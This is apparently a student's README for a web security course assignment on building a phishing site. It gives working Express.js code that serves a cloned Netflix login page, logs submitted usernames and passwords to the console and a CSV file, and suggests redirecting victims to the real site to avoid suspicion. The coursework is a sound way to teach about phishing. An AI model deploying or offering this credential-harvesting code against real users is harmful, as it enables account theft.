Joshua Murphy

CS 595 - Web Security

Assignment 7

<br> 

# Create a simple phishing site

For this step in the assignment, one of the sites from the list of 100
sites given for assignment 2 that has a login component will be used to 
create a phishing site hosted on a local server that stores the username and
password entered into the fake webpage into a file and prints the credentials
to the console.

For this assignment, I chose the Netflix login page to duplicate from my list
for 100 sites. First, I copied the html for the page and saved it to a file called
netflix.ejs. The html is rather large, so I will not cover it in the readme section 
of this report. No major changes were made to the html itself. 

For the code on the server side of things, it was, surprisingly, pretty easy to 
get up and running. First, similarly to assignment 6, we are storing information,
in this case the username and password entered on the phishing site, to a csv
file, therefore, we are using the function checkForFile() that takes in the 
path of the file, stored in the variable csv. If it does not exist, it creates
a csv file with the columns username and password printed into the file. 
Next, there is a storeData() function that takes in the username, password, and path
of the csv file, removes the quotations and an extra backslash character when 
printing said character to the file, and proceeds to append the username 
and password to the file. Finally, the netflix.ejs page is render to the user, and 
then waits for a post request from the user to enter in to the userLoginId and 
password fields, which will be stored in the variables username and password. The
username and password are printed to the console log, then we run through the 
functions detailed earlier, specifically the checkForFile() and StoreData() functions, and then a new instance of the netflix.ejs is rendered back to the user 
to repeat the process. In a real world environment, we could probably render to 
the real netflix webpage with an alert that pings the user with aa message similar to 
"An error has occurred, please reenter credentials." or just hope that they are
still logged in to a previous session to keep up the appearance, but for this 
assignment I just have it render back to the phishing page.

    const bodyParser = require('body-parser')
    const express = require('express')
    const port = '4000'
    const app = express()
    const fs = require('fs')
    const { json } = require('express/lib/response')
    app.use(bodyParser.urlencoded({ extended: false }))
    app.use(bodyParser.json())
    var csv = 'log.csv'


    //Static Files
    app.use(express.static('public'))
    app.use('imgs', express.static(__dirname + 'public/imgs'))


    //Set Views
    app.set('views', './views')
    app.set('view engine', 'ejs')

    function checkForFile(path){
        if (!fs.existsSync(csv))
            fs.writeFileSync(path, 'Username,Password', json)
    }

    var storeData = (username, password, path) => {
        try {
            var str = JSON.stringify(username) + "," +
                    JSON.stringify(password)

                str = str.toString()
                str = str.replaceAll('""', '')
                str = str.replaceAll('\\\\', '\\')

            fs.appendFile(path, '\n' + str, function(err){
                if (err) throw err
            })
        } catch(err) {
            console.error(err)
        }
    }
    //Get pages
    app.route("/").get((req, res) => {
        res.render("netflix")
    }).post((req, res) => {
        username = req.body.userLoginId
        password = req.body.password
        console.log(`Username: ${username}`)
        console.log(`Password: ${password}`)
        checkForFile(csv)
        storeData(username, password, csv)
        res.render("netflix")
    })
    app.listen(port)

## Images

Phishing Login Page for Netflix

![phishing_page](images/phishing_page.png)

<br/>

## Video Link

https://youtu.be/htIJevJW40g

<br/>

# References

1.) Assignment 7 markdown - https://github.com/phonedude/cs595-s22/blob/main/assignments/assignment-7.md